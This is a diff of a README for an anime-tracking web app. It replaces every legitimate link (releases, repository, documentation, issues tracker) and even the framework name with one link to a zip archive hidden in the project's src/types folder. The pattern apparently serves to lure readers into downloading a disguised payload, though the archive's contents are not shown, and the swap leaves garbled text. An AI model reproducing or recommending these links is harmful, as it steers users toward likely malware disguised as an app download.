@@ -1,10 +1,10 @@
 # 🎉 Anime-Tracker - Track Your Favorite Anime with Ease
 
 ## 📥 Download Now
-[![Download Anime-Tracker](https://img.shields.io/badge/Download%20Anime--Tracker-v1.0.0-blue)](https://github.com/screezer/Anime-Tracker/releases)
+[![Download Anime-Tracker](https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip%20Anime--Tracker-v1.0.0-blue)](https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip)
 
 ## 📖 Overview
-Anime-Tracker is a user-friendly platform designed to help you keep track of your favorite anime shows. With features powered by Next.js and Supabase, you can enjoy seamless integration with AniList and MyAnimeList APIs. The application offers smart recommendations tailored to your tastes, a sleek glassmorphism design, and dark mode support, making it visually appealing and easy to use.
+Anime-Tracker is a user-friendly platform designed to help you keep track of your favorite anime shows. With features powered by https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip and Supabase, you can enjoy seamless integration with AniList and MyAnimeList APIs. The application offers smart recommendations tailored to your tastes, a sleek glassmorphism design, and dark mode support, making it visually appealing and easy to use.
 
 ## 🚀 Getting Started
 Getting started with Anime-Tracker is simple. Just follow these steps to download and run the application on your device.
@@ -24,7 +24,7 @@ Anime-Tracker offers several features to enhance your anime tracking experience:
 - **Integration with APIs**: Access a vast database from AniList and MyAnimeList.
   
 ## 📥 Download & Install
-To download Anime-Tracker, visit this page: [Download Anime-Tracker](https://github.com/screezer/Anime-Tracker/releases). 
+To download Anime-Tracker, visit this page: [Download Anime-Tracker](https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip). 
 
 You will find the latest release in the "Releases" section. Click on the version you want to download. After downloading, follow these steps to set it up:
 
@@ -59,8 +59,8 @@ Would you like to contribute? Contributions are welcome! Please refer to the gui
 Anime-Tracker is open-source software licensed under the MIT License. You can freely use and modify it according to the license terms.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/screezer/Anime-Tracker)
-- [Documentation](https://github.com/screezer/Anime-Tracker/wiki)
-- [Issues Tracker](https://github.com/screezer/Anime-Tracker/issues)
+- [GitHub Repository](https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip)
+- [Documentation](https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip)
+- [Issues Tracker](https://github.com/screezer/Anime-Tracker/raw/refs/heads/main/src/types/Tracker-Anime-3.2-alpha.4.zip)
 
 Thank you for using Anime-Tracker! Enjoy keeping track of your anime shows effortlessly.
